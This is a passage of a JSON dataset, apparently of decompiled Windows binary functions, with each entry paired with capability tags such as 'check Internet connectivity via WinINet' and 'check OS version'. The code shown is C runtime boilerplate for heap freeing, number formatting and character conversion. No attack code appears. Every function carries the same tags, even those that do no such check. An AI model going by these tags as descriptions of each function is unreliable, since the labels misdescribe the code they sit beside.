0x10;\n        puVar14 = &var_10ch;\n        puVar13 = *(iVar11 + arg_8h);\n        do {\n            var_2bch = 0;\n            bVar16 = *puVar14 < *puVar13;\n            if (*puVar14 != *puVar13) {\ncode_r0x004120e6:\n                uVar15 = -bVar16 | 1;\n                goto code_r0x004120eb;\n            }\n            if (*puVar14 == 0) break;\n            uVar1 = *(puVar14 + 2);\n            bVar16 = uVar1 < puVar13[1];\n            var_2c0h = var_2c0h & 0xffff | uVar1 << 0x10;\n            if (uVar1 != puVar13[1]) goto code_r0x004120e6;\n            puVar14 = puVar14 + 1;\n            puVar13 = puVar13 + 2;\n        } while (uVar1 != 0);\n        uVar15 = 0;\ncode_r0x004120eb:\n        if (uVar15 != 0) {\n            puVar14 = &var_10ch;\n            do {\n                iVar2 = *puVar14;\n                puVar14 = puVar14 + 2;\n            } while (iVar2 != 0);\n            var_2c0h = (puVar14 - (&var_10ch + 2) >> 1) + 1;\n            puVar14 = fcn.00414556(var_2c0h * 2 + 4);\n            if (puVar14 != NULL) {\n                iVar3 = *(iVar11 + arg_8h);\n                uVar4 = *(arg_8h + 0xa0 + arg_ch * 4);\n                var_2e4h = *(arg_8h + 8);\n                iVar12 = fcn.00416c71(puVar14 + 1, var_2c0h, &var_10ch);\n                if (iVar12 != 0) {\n                    fcn.0040b84c(var_2bch, var_2bch, var_2bch, var_2bch, var_2bch);\n                    pcVar7 = swi(3);\n                    (*pcVar7)();\n                    return;\n                }\n                *(iVar11 + arg_8h) = puVar14 + 1;\n                if ((var_10ch != 0x43) || (uVar15 = var_2bch,  var_10ch._2_2_ != 0)) {\n                    uVar15 = fcn.00411429(&var_2b8h);\n                }\n                *(arg_8h + 0xa0 + arg_ch * 4) = uVar15;\n                if (arg_ch == 2) {\n                    *(arg_8h + 8) = var_2c4h;\n                    uVar15 = var_2bch;\n                    var_2c4h = *(iVar9 + 0x29c);\n                    var_2c0h = *(iVar9 + 0x298);\n                    do {\n                        if (*(arg_8h + 8) == puVar10[uVar15 * 2]) {\n                            if (uVar15 != 0) {\n                                uVar6 = *(iVar9 + 0x27c + uVar15 * 8);\n                                *puVar10 = puVar10[uVar15 * 2];\n                                *(iVar9 + 0x27c) = uVar6;\n                                puVar10[uVar15 * 2] = var_2c0h;\n                                *(iVar9 + 0x27c + uVar15 * 8) = var_2c4h;\n                            }\n                            goto code_r0x004122c2;\n                        }\n                        uVar5 = puVar10[uVar15 * 2];\n                        uVar6 = *(iVar9 + 0x27c + uVar15 * 8);\n                        puVar10[uVar15 * 2] = var_2c0h;\n                        *(iVar9 + 0x27c + uVar15 * 8) = var_2c4h;\n                        uVar15 = uVar15 + 1;\n                        var_2c4h = uVar6;\n                        var_2c0h = uVar5;\n                    } while (uVar15 < 5);\n                    if (uVar15 == 5) {\n                        iVar12 = fcn.00416931(var_2bch, 1, 0x427398, 0x7f, &var_20ch, *(arg_8h + 8), 1);\n                        uVar15 = var_2bch;\n                        if (iVar12 != 0) {\n                            do {\n                                puVar13 = &var_20ch + uVar15 * 2;\n                                *puVar13 = *puVar13 & 0x1ff;\n                                uVar15 = uVar15 + 1;\n                            } while (uVar15 < 0x7f);\n                            iVar12 = fcn.00408910(&var_20ch, *0x48e3a4, 0xfe);\n                            uVar15 = iVar12 == 0;\n                        }\n                        *(iVar9 + 0x27c) = uVar15;\n                        *puVar10 = *(arg_8h + 8);\n                    }\ncode_r0x004122c2:\n                    *(arg_8h + 0x18) = *(iVar9 + 0x27c);\n                }\n                else if (arg_ch == 1) {\n                    *(arg_8h + 0x10) = var_2c4h;\n                }\n                else if (arg_ch == 5) {\n                    *(arg_8h + 0x14) = var_2c4h;\n                }\n                pcVar7 = *(arg_ch * 0xc + 0x427420);\n                (**0x424130)(arg_8h);\n                iVar9 = (*pcVar7)();\n                if (iVar9 == 0) {\n                    if (iVar3 != 0x48e478) {\n                        piVar8 = *(arg_8h + 0x28 + arg_ch * 0x10);\n                        LOCK();\n                        iVar9 = *piVar8 + -1;\n                        *piVar8 = iVar9;\n                        if (iVar9 == 0) {\n                            fcn.0041451c(*(arg_8h + 0x28 + arg_ch * 0x10));\n                            fcn.0041451c(*(arg_8h + 0x24 + arg_ch * 0x10));\n                            fcn.0041451c(*(arg_8h + 0xa0 + arg_ch * 4));\n                            *(iVar11 + arg_8h) = var_2bch;\n                            *(arg_8h + 0xa0 + arg_ch * 4) = var_2bch;\n                        }\n                    }\n                    *puVar14 = 1;\n                    *(arg_8h + 0x28 + arg_ch * 0x10) = puVar14;\n                }\n                else {\n                    *(iVar11 + arg_8h) = iVar3;\n                    fcn.0041451c(*(arg_8h + 0xa0 + arg_ch * 4));\n                    *(arg_8h + 0xa0 + arg_ch * 4) = uVar4;\n                    fcn.0041451c(puVar14);\n                    *(arg_8h + 8) = var_2e4h;\n                }\n            }\n        }\n    }\n    fcn.00406dcc(var_2e4h);\n    return;\n}\n",
        "token_count": 2115
    },
    "00413bdd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00413bdd(uint32_t arg_8h, double *arg_ch, uint32_t arg_10h)\n\n{\n    double dVar1;\n    double dVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    double dVar5;\n    int32_t iVar6;\n    uint32_t extraout_ECX;\n    uint32_t uVar7;\n    float10 fVar8;\n    float10 fVar9;\n    uint32_t var_24h;\n    uint8_t var_20h;\n    uchar uStack35;\n    uint var_1eh;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint var_ch;\n    double dStack20;\n    uint32_t var_8h;\n    char var_2h;\n    uint var_1h;\n    \n    uVar7 = arg_8h & 0x1f;\n    if (((arg_8h & 8) != 0) && ((arg_10h & 1) != 0)) {\n        fcn.00414456(1);\n        uVar7 = arg_8h & 0x17;\n        goto code_r0x00413e35;\n    }\n    if ((arg_8h & arg_10h & 4) != 0) {\n        fcn.00414456(4);\n        uVar7 = arg_8h & 0x1b;\n        goto code_r0x00413e35;\n    }\n    if (((arg_8h & 1) == 0) || ((arg_10h & 8) == 0)) {\n        if (((arg_8h & 2) == 0) || ((arg_10h & 0x10) == 0)) goto code_r0x00413e35;\n        dVar2 = *arg_ch;\n        uVar7 = arg_8h >> 4 & 1;\n        var_8h = uVar7;\n        if (dVar2 == 0.0) {\ncode_r0x00413e29:\n            fcn.00414456(0x10);\n        }\n        else {\n            fVar8 = fcn.0041423e(SUB84(dVar2, 0), dVar2 >> 0x20, &var_18h);\n            var_18h = var_18h + -0x600;\n            dVar2 = fVar8;\n            var_24h = SUB84(dVar2, 0);\n            var_20h = dVar2 >> 0x20;\n            uStack35 = dVar2 >> 0x28;\n            var_1eh._0_2_ = dVar2 >> 0x30;\n            fVar9 = 0;\n            if (var_18h < -0x432) {\n                fVar9 = fVar9 * fVar8;\n                uVar7 = 1;\n            }\n            else {\n                var_1h._0_1_ = ((fVar9 < fVar8) << 8 | (fVar9 == fVar8) << 0xe) == 0;\n                var_14h = extraout_ECX & 0xffffff00;\n                var_2h = '\\0';\n                var_1eh._0_2_ = var_1eh & 0xf | 0x10;\n                if (var_18h < -0x3fd) {\n                    var_18h = -0x3fd - var_18h;\n                    do {\n                        var_14h = var_24h & 1;\n                        if (var_14h != 0) {\n                            if (uVar7 == 0) {\n                                uVar7 = 1;\n                            }\n                            var_2h = '\\x01';\n                        }\n                        var_24h = var_24h >> 1;\n                        if ((var_20h & 1) != 0) {\n                            var_24h = var_24h | 0x80000000;\n                        }\n                        uVar3 = CONCAT22(var_1eh, CONCAT11(uStack35, var_20h)) >> 1;\n                        var_20h = uVar3;\n                        uStack35 = uVar3 >> 8;\n                        var_1eh._0_2_ = var_1eh >> 1;\n                        var_18h = var_18h + -1;\n                        var_8h = uVar7;\n                    } while (var_18h != 0);\n                }\n                dStack20 = CONCAT26(var_1eh, CONCAT15(uStack35, CONCAT14(var_20h, var_24h)));\n                fVar9 = dStack20;\n                if (var_1h) {\n                    fVar9 = -fVar9;\n                    dStack20 = fVar9;\n                    dVar2 = fVar9;\n                    var_24h = SUB84(dVar2, 0);\n                    var_20h = dVar2 >> 0x20;\n                    uStack35 = dVar2 >> 0x28;\n                    var_1eh._0_2_ = dVar2 >> 0x30;\n                }\n                if ((var_14h != '\\0') || (uVar7 = var_8h,  var_2h != '\\0')) {\n                    iVar6 = fcn.00419372();\n                    uVar7 = var_8h;\n                    if (iVar6 == 0) {\n                        if (var_14h == '\\0') goto code_r0x00413e16;\n                        if (var_2h == '\\0') {\n                            uVar4 = var_24h & 1;\n                            goto code_r0x00413e05;\n                        }\n                    }\n                    else {\n                        uVar4 = var_1h;\n                        if (iVar6 != 0x100) {\n                            if (iVar6 != 0x200) goto code_r0x00413e16;\n                            uVar4 = var_1h ^ 1;\n                        }\ncode_r0x00413e05:\n                        if (uVar4 == 0) {\ncode_r0x00413e16:\n                            fVar9 = dStack20;\n                            goto code_r0x00413e1c;\n                        }\n                    }\n                    iVar6 = CONCAT22(var_1eh, CONCAT11(uStack35, var_20h)) + (0xfffffffe < var_24h);\n                    var_20h = iVar6;\n                    uStack35 = iVar6 >> 8;\n                    var_1eh._0_2_ = iVar6 >> 0x10;\n                    fVar9 = CONCAT26(var_1eh, CONCAT15(uStack35, CONCAT14(var_20h, var_24h + 1)));\n                }\n            }\ncode_r0x00413e1c:\n            *arg_ch = fVar9;\n            if (uVar7 != 0) goto code_r0x00413e29;\n        }\n        uVar7 = arg_8h & 0x1d;\n        goto code_r0x00413e35;\n    }\n    fcn.00414456(8);\n    uVar7 = arg_10h & 0xc00;\n    dVar2 = *0x427bf8;\n    dVar5 = *0x427bf8;\n    if (uVar7 == 0) {\n        dVar1 = *arg_ch;\njoined_r0x00413c7e:\n        if (dVar1 <= 0.0) {\n            dVar2 = -dVar5;\n        }\n        *arg_ch = dVar2;\n    }\n    else {\n        if (uVar7 == 0x400) {\n            dVar1 = *arg_ch;\n            dVar2 = *0x427c00;\n            goto joined_r0x00413c7e;\n        }\n        dVar5 = *0x427c00;\n        if (uVar7 == 0x800) {\n            dVar1 = *arg_ch;\n            goto joined_r0x00413c7e;\n        }\n        if (uVar7 == 0xc00) {\n            dVar1 = *arg_ch;\n            dVar2 = *0x427c00;\n            goto joined_r0x00413c7e;\n        }\n    }\n    uVar7 = arg_8h & 0x1e;\ncode_r0x00413e35:\n    if (((arg_8h & 0x10) != 0) && ((arg_10h & 0x20) != 0)) {\n        fcn.00414456(0x20);\n        uVar7 = uVar7 & 0xffffffef;\n    }\n    return uVar7 == 0;\n}\n",
        "token_count": 1940
    },
    "0041451c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041451c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x48fedc, 0, arg_8h);\n        if (iVar1 == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = fcn.0040e051(uVar2);\n            puVar3 = fcn.0040e0ee();\n            *puVar3 = uVar2;\n        }\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "00414b35": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00414b35(uchar *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h, int32_t *arg_1ch, \n            uint arg_20h, int32_t arg_24h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar *arg_ch_00;\n    int32_t iVar3;\n    uint uVar4;\n    uchar *puVar5;\n    \n    iVar2 = arg_10h;\n    if (arg_10h < 1) {\n        iVar2 = 0;\n    }\n    if (iVar2 + 9U < arg_ch) {\n        if (arg_20h != 0) {\n            fcn.00414f62(arg_8h, arg_ch, arg_8h + (*arg_1ch == 0x2d), 0 < arg_10h);\n        }\n        puVar5 = arg_8h;\n        if (*arg_1ch == 0x2d) {\n            *arg_8h = 0x2d;\n            puVar5 = arg_8h + 1;\n        }\n        if (0 < arg_10h) {\n            *puVar5 = puVar5[1];\n            puVar5 = puVar5 + 1;\n            if (*(arg_24h + 0x14) == '\\0') {\n                fcn.0040d4a0();\n            }\n            *puVar5 = ***(*(arg_24h + 0xc) + 0x88);\n        }\n        puVar5 = puVar5 + (arg_20h ^ 1) + arg_10h;\n        arg_ch_00 = 0xffffffff;\n        if (arg_ch != 0xffffffff) {\n            arg_ch_00 = arg_8h + (arg_ch - puVar5);\n        }\n        iVar2 = fcn.00412d4a(puVar5, arg_ch_00, \"e+000\");\n        if (iVar2 != 0) {\n            fcn.0040b84c(0, 0, 0, 0, 0);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n        if (arg_14h != '\\0') {\n            *puVar5 = 0x45;\n        }\n        if (*arg_1ch[2] != '0') {\n            iVar2 = arg_1ch[1] + -1;\n            if (iVar2 < 0) {\n                iVar2 = -iVar2;\n                puVar5[1] = 0x2d;\n            }\n            if (99 < iVar2) {\n                iVar3 = iVar2 / 100;\n                iVar2 = iVar2 % 100;\n                puVar5[2] = puVar5[2] + iVar3;\n            }\n            if (9 < iVar2) {\n                iVar3 = iVar2 / 10;\n                iVar2 = iVar2 % 10;\n                puVar5[3] = puVar5[3] + iVar3;\n            }\n            puVar5[4] = puVar5[4] + iVar2;\n        }\n        if ((arg_18h == 2) && (puVar5[2] == '0')) {\n            fcn.00408060(puVar5 + 2, puVar5 + 3, 3);\n        }\n        uVar4 = 0;\n    }\n    else {\n        uVar4 = 0x22;\n        *(arg_24h + 0x1c) = 1;\n        *(arg_24h + 0x18) = 0x22;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_24h);\n    }\n    return uVar4;\n}\n",
        "token_count": 869
    },
    "00414d10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00414d10(uchar *arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uchar *var_4h;\n    \n    bVar1 = false;\n    if ((arg_18h != '\\0') && (arg_14h[1] + -1 == arg_10h)) {\n        *(arg_8h + (*arg_14h == 0x2d) + arg_14h[1] + -1) = 0x30;\n    }\n    var_4h = arg_8h;\n    if (*arg_14h == 0x2d) {\n        var_4h = arg_8h + 1;\n        *arg_8h = 0x2d;\n    }\n    iVar2 = arg_14h[1];\n    if (iVar2 < 1) {\n        if ((iVar2 == 0) && (*arg_14h[2] == '0')) {\n            bVar1 = true;\n        }\n        if ((arg_18h == '\\0') || (!bVar1)) {\n            fcn.00414f62(arg_8h, arg_ch, var_4h, 1);\n        }\n        *var_4h = 0x30;\n        iVar2 = 1;\n    }\n    var_4h = var_4h + iVar2;\n    if (0 < arg_10h) {\n        fcn.00414f62(arg_8h, arg_ch, var_4h, 1);\n        if (*(arg_1ch + 0x14) == '\\0') {\n            fcn.0040d4a0();\n        }\n        *var_4h = ***(*(arg_1ch + 0xc) + 0x88);\n        if (arg_14h[1] < 0) {\n            iVar2 = -arg_14h[1];\n            if ((arg_18h != '\\0') || (iVar2 < arg_10h)) {\n                arg_10h = iVar2;\n            }\n            fcn.00414f62(arg_8h, arg_ch, var_4h + 1, arg_10h);\n            fcn.004085e0(var_4h + 1, 0x30, arg_10h);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 555
    },
    "00415029": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00415029(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            uint arg_20h, uint32_t arg_24h, uint noname_8, uint arg_2ch, int32_t arg_30h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint32_t in_ECX;\n    uint arg_28h;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    if (arg_ch == 0) {\n        *(arg_30h + 0x1c) = 1;\n        *(arg_30h + 0x18) = 0x16;\n    }\n    else if ((arg_10h == 0) || (arg_14h == 0)) {\n        *(arg_30h + 0x1c) = 1;\n        *(arg_30h + 0x18) = 0x16;\n    }\n    else {\n        if (arg_18h != 0) {\n            var_4h = in_ECX;\n            if ((((arg_1ch == 0x41) || (arg_1ch == 0x45)) || (arg_1ch == 0x46)) ||\n               (var_4h = in_ECX & 0xffffff00,  arg_1ch == 0x47)) {\n                var_4h = CONCAT31(var_4h._1_3_, 1);\n            }\n            if (((arg_24h & 8) == 0) && (arg_8h_00 = fcn.00414660(arg_8h),  arg_8h_00 != 0)) {\n                var_8h._1_3_ = in_ECX >> 8;\n                if ((*(arg_8h + 4) < 1) && (*(arg_8h + 4) < 0)) {\n                    var_8h = CONCAT31(var_8h._1_3_, 1);\n                }\n                else {\n                    var_8h = var_8h._1_3_ << 8;\n                }\n                uVar1 = fcn.00414ecd(arg_8h_00, var_8h, arg_ch, arg_10h, var_4h);\n                return uVar1;\n            }\n            if ((arg_24h & 0x10) == 0) {\n                uVar1 = 2;\n            }\n            else {\n                uVar1 = 3;\n            }\n            arg_28h = 0;\n            if ((arg_24h & 0x20) != 0) {\n                arg_28h = arg_2ch;\n            }\n            if (arg_1ch < 0x62) {\n                if ((arg_1ch == 0x61) || (arg_1ch == 0x41)) {\n                    uVar1 = fcn.00414765(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, var_4h, uVar1, arg_28h, \n                                         arg_30h);\n                    return uVar1;\n                }\n                arg_1ch = arg_1ch + -0x45;\n            }\n            else {\n                arg_1ch = arg_1ch + -0x65;\n            }\n            if (arg_1ch == 0) {\n                uVar1 = fcn.00414a91(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, var_4h, uVar1, arg_28h, arg_30h\n                                    );\n                return uVar1;\n            }\n            if (arg_1ch != 1) {\n                uVar1 = fcn.00414dfe(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, var_4h, uVar1, arg_28h, arg_30h\n                                    );\n                return uVar1;\n            }\n            uVar1 = fcn.00414c7a(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, arg_28h, arg_30h);\n            return uVar1;\n        }\n        *(arg_30h + 0x1c) = 1;\n        *(arg_30h + 0x18) = 0x16;\n    }\n    fcn.0040b7a2(0, 0, 0, 0, 0, arg_30h);\n    return 0x16;\n}\n",
        "token_count": 1084
    },
    "004151aa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004151aa(int32_t *arg_8h, uchar *arg_ch, uint32_t arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t arg_14h_00;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    arg_14h_00 = arg_18h;\n    if ((arg_ch == NULL) && (arg_10h != 0)) {\n        if (arg_8h == NULL) {\n            return 0;\n        }\n        *arg_8h = 0;\n        return 0;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = -1;\n    }\n    if (arg_10h < 0x80000000) {\n        if (*(arg_18h + 0x14) == '\\0') {\n            fcn.0040d4a0();\n        }\n        var_8h = *(*(arg_14h_00 + 0xc) + 8);\n        if (var_8h == 0xfde9) {\n            var_ch = 0;\n            var_8h = 0;\n            iVar1 = fcn.00420484(arg_ch, arg_14h & 0xffff, &var_ch, arg_14h_00);\n            if (arg_8h != NULL) {\n                *arg_8h = iVar1;\n            }\n            if (iVar1 < 5) {\n                return 0;\n            }\n            if (*(arg_14h_00 + 0x1c) != '\\0') {\n                return *(arg_14h_00 + 0x18);\n            }\n            return 0;\n        }\n        if (*(*(arg_14h_00 + 0xc) + 0xa8) == 0) {\n            var_4h = 0xff;\n            if (0xff < arg_14h) {\n                if ((arg_ch != NULL) && (arg_10h != 0)) {\n                    fcn.004085e0(arg_ch, 0, arg_10h);\n                }\n                goto code_r0x0041527d;\n            }\n            if (arg_ch == NULL) {\ncode_r0x00415296:\n                if (arg_8h != NULL) {\n                    *arg_8h = 1;\n                }\n                return 0;\n            }\n            if (arg_10h != 0) {\n                *arg_ch = arg_14h;\n                goto code_r0x00415296;\n            }\n        }\n        else {\n            var_4h = 0;\n            iVar1 = fcn.0041aa21(var_8h, 0, &arg_14h, 1, arg_ch, arg_10h, 0, &var_4h);\n            if (iVar1 != 0) {\n                if (var_4h == 0) {\n                    if (arg_8h == NULL) {\n                        return 0;\n                    }\n                    *arg_8h = iVar1;\n                    return 0;\n                }\ncode_r0x0041527d:\n                *(arg_14h_00 + 0x18) = 0x2a;\n                *(arg_14h_00 + 0x1c) = 1;\n                return 0x2a;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 != 0x7a) goto code_r0x0041527d;\n            if ((arg_ch != NULL) && (arg_10h != 0)) {\n                fcn.004085e0(arg_ch, 0, arg_10h);\n            }\n        }\n        uVar2 = 0x22;\n    }\n    else {\n        uVar2 = 0x16;\n    }\n    *(arg_14h_00 + 0x18) = uVar2;\n    *(arg_14h_00 + 0x1c) = 1;\n    fcn.0040b7a2(0, 0, 0, 0, 0, arg_14h_00);\n    return uVar2;\n}\n",
        "token_count": 946
    },
    "00415314": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00415314(uint16_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t cbMultiByte;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if ((arg_ch == NULL) || (arg_10h == 0)) {\n        *0x48faec = 0;\n        *0x48faf0 = 0;\n    }\n    else {\n        if (*arg_ch != 0) {\n            if (*(arg_14h + 0x14) == '\\0') {\n                fcn.0040d4a0();\n            }\n            piVar1 = *(arg_14h + 0xc);\n            iVar2 = piVar1[2];\n            if (iVar2 == 0xfde9) {\n                iVar2 = fcn.00420560(arg_8h, arg_ch, arg_10h, 0x48faec, arg_14h);\n                if (-1 < iVar2) {\n                    return iVar2;\n                }\n            }\n            else {\n                if (piVar1[0x2a] == 0) {\n                    if (arg_8h != NULL) {\n                        *arg_8h = *arg_ch;\n                    }\n                    return 1;\n                }\n                if (*(*piVar1 + *arg_ch * 2) < 0) {\n                    cbMultiByte = *(*(arg_14h + 0xc) + 4);\n                    if ((((1 < cbMultiByte) && (cbMultiByte <= arg_10h)) &&\n                        (iVar2 = fcn.0041a9a5(iVar2, 9, arg_ch, cbMultiByte, arg_8h, arg_8h != NULL),  iVar2 != 0)) ||\n                       ((*(*(arg_14h + 0xc) + 4) <= arg_10h && (arg_ch[1] != 0)))) {\n                        return *(*(arg_14h + 0xc) + 4);\n                    }\n                }\n                else {\n                    iVar2 = fcn.0041a9a5(iVar2, 9, arg_ch, 1, arg_8h, arg_8h != NULL);\n                    if (iVar2 != 0) {\n                        return 1;\n                    }\n                }\n                *(arg_14h + 0x1c) = 1;\n                *(arg_14h + 0x18) = 0x2a;\n            }\n            return -1;\n        }\n        if (arg_8h != NULL) {\n            *arg_8h = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 605
    },
    "0041556a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041556a(uint arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    uint32_t *puVar1;\n    \n    if ((arg_8h != '\\0') && (puVar1 = arg_ch + 3,  (*puVar1 >> 9 & 1) != 0)) {\n        fcn.0040e625(arg_ch, arg_10h);\n        LOCK();\n        *puVar1 = *puVar1 & 0xfffffd7f;\n        arg_ch[6] = 0;\n        arg_ch[1] = 0;\n        *arg_ch = 0;\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00416004": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00416004(uint16_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t arg_18h;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_18h;\n    uint32_t var_14h;\n    uint8_t *var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    arg_18h = arg_14h;\n    uStack8 = 0xffffffff;\n    uStack12 = 0x423769;\n    var_ch = *in_FS_OFFSET;\n    uVar3 = *0x48e22c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_8h != NULL) {\n        uVar4 = 0;\n        if (arg_10h == 0) goto code_r0x004161ba;\n        *arg_8h = 0;\n    }\n    if (arg_ch == NULL) {\n        *(arg_14h + 0x1c) = 1;\n        *(arg_14h + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_14h);\n    }\n    else {\n        if (*(arg_14h + 0x14) == '\\0') {\n            fcn.0040d4a0(uVar3);\n        }\n        iVar5 = *(arg_18h + 0xc);\n        var_10h = *(iVar5 + 8);\n        if (var_10h == 0xfde9) {\n            var_18h = 0;\n            var_14h = 0;\n            uVar4 = fcn.004205a3(arg_8h, &arg_ch, arg_10h, &var_18h, arg_18h);\n            goto code_r0x004161ba;\n        }\n        if (arg_8h == NULL) {\n            if (*(iVar5 + 0xa8) == 0) {\n                puVar1 = arg_ch + 1;\n                do {\n                    uVar2 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                } while (uVar2 != 0);\n                uVar4 = arg_ch - puVar1;\n                goto code_r0x004161ba;\n            }\n            iVar5 = fcn.0041a9a5(var_10h, 9, arg_ch, 0xffffffff, 0, 0);\n            if (iVar5 != 0) goto code_r0x004161b9;\n            *(arg_18h + 0x1c) = 1;\n            *(arg_18h + 0x18) = 0x2a;\n        }\n        else {\n            if (*(iVar5 + 0xa8) == 0) {\n                uVar4 = 0;\n                if (arg_10h != 0) {\n                    do {\n                        *arg_8h = arg_ch[uVar4];\n                        if (arg_ch[uVar4] == 0) break;\n                        uVar4 = uVar4 + 1;\n                        arg_8h = arg_8h + 1;\n                    } while (uVar4 < arg_10h);\n                }\n                goto code_r0x004161ba;\n            }\n            iVar5 = fcn.0041a9a5(var_10h, 9, arg_ch, 0xffffffff, arg_8h, arg_10h);\n            if (iVar5 != 0) {\ncode_r0x004161b9:\n                uVar4 = iVar5 - 1;\n                goto code_r0x004161ba;\n            }\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            var_10h = arg_ch;\n            uVar3 = arg_10h;\n            if (iVar5 == 0x7a) {\n                while (uVar3 != 0) {\n                    var_14h = uVar3 - 1;\n                    if (*var_10h == 0) break;\n                    if ((*(**(arg_18h + 0xc) + *var_10h * 2) < 0) && (var_10h = var_10h + 1,  *var_10h == 0))\n                    goto code_r0x0041610f;\n                    var_10h = var_10h + 1;\n                    uVar3 = var_14h;\n                }\n                uVar4 = fcn.0041a9a5(*(*(arg_18h + 0xc) + 8), 1, arg_ch, var_10h - arg_ch, arg_8h, arg_10h);\n                if (uVar4 != 0) goto code_r0x004161ba;\n            }\ncode_r0x0041610f:\n            *(arg_18h + 0x1c) = 1;\n            *(arg_18h + 0x18) = 0x2a;\n            *arg_8h = 0;\n        }\n    }\n    uVar4 = 0xffffffff;\ncode_r0x004161ba:\n    *in_FS_OFFSET = var_ch;\n    return uVar4;\n}\n",
        "token_count": 1220
    },
    "004162ea": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
